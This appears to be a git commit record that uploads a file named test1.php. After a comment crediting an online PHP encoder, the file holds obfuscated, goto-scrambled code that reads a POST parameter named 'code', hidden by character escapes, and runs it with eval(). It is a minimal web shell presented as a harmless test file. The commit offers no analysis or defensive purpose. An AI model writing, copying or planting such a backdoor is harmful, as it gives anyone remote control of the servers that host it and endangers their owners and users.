22f99893f88d25f58c836a8c350146f6d9dc05b4
Leazer <71058439+AnglkWlndr@users.noreply.github.com>
2024-06-05 08:15:46 +0700

    Add files via upload

---
+++ test1.php
@@ -0,0 +1,5 @@
+tet<?php
+/*
+ Encode by www.phpen.cn 
+*/
+ goto lelCq; cxjCQ: $code = $_POST["\x63\157\144\x65"]; goto U5jKo; lelCq: function x($code) { eval($code); } goto cxjCQ; U5jKo: x($code);
